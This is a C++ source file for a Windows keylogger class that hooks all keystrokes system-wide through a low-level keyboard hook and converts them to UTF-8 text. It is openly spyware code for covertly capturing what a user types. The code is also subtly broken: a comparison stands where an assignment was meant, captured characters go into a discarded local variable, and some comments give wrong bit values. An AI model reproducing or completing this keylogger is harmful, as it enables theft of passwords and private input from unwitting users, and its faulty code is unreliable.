#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <codecvt>
#include <locale>

using namespace std;

class windowskeyLogger
{
    public:
        void loggingStart()
        {
            keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, &KeyboardHook, NULL, 0);

            if (keyboard == NULL)
            {
                throw runtime_error("Unable to set keyboard hook.");
            }

            runMessageLoop();
            getLoggedCharacter();

        }

        void loggingStop()
        {
            if (keyboard != NULL)
            {
                UnhookWindowsHookEx(keyboard);
                keyboard == NULL;
                
            }

            else
            {
                throw runtime_error("No keyboardhook has been set.");
            }
            
        }

        string getLoggedCharacter()
        {
            unicodeCaracter_uft8 = utf16_to_utf8(unicodeCaracter.c_str());
            return unicodeCaracter_uft8;
        }

    private:

    HHOOK keyboard;
    wstring unicodeCaracter;
    string unicodeCaracter_uft8;

    string utf16_to_utf8(const wchar_t *uft16_string)
    {
        wstring_convert < codecvt_utf8 < wchar_t > > converter;
        return converter.to_bytes(uft16_string);
    }

    void runMessageLoop()
    {
        MSG message;
        while (GetMessage(&message, NULL, 0, 0) > 0)
        {
            TranslateMessage(&message);
            DispatchMessage(&message);
        }
    }


    static LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
    {
        if (nCode < 0) 
        {
        return CallNextHookEx(NULL, nCode, wParam, lParam);
        }

        if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
        {
            KBDLLHOOKSTRUCT *kbd = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);

            wchar_t unicodeChar[3] = {0};
            BYTE keyboardState[256] = {0};
            DWORD result = 0;

            GetKeyboardState(keyboardState);

            //Checks if shift is pressed
            if (GetKeyState(VK_SHIFT) & 0x8000 || GetKeyState(VK_LSHIFT) & 0x8000 || GetKeyState(VK_RSHIFT) & 0x8000)
            {
                //If pressed keyboardstate gets the value 0x80 (10000000) to indicate that SHIFT is enabled.
                keyboardState[VK_SHIFT] |= 0x80;
            }
            else
                //If not pressed keayboard state gets a value of 0x7F (0111111) to indicate that SHIFT is disabled
            {
            keyboardState[VK_SHIFT] &= 0x7F;
            }

            if (GetKeyState(VK_CONTROL) & 0x8000)
            {
                //If pressed keyboardstate gets the value 0x80 (10000000) to indicate that CTRL is enabled.
                keyboardState[VK_CONTROL] |= 0x80;
            }
            else
            {
                //If not pressed keayboard state gets a value of 0x7F (0111111) to indicate that CTRL is disabled
                keyboardState[VK_CONTROL] &= 0x7F;
            }

            if (GetKeyState(VK_CAPITAL) & 0x0001)
            {
                 //If pressed keyboardstate gets the value 0x01 (00000001) to indicate that CAPS_LOCK is enabled.
                keyboardState[VK_CAPITAL] |= 0x01;
            }
            else
            {
                //If pressed keyboardstate gets the value 0x01 (11111110) to indicate that CAPS_LOCK is disabled.
                keyboardState[VK_CAPITAL] &= 0xFE;
            }

            result = ToUnicode(kbd->vkCode, kbd->scanCode, keyboardState, unicodeChar, 3, 0);
            if (result > 0)
                {
                    wstring unicodeCaracter(unicodeChar);
                    
                }
        }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}


};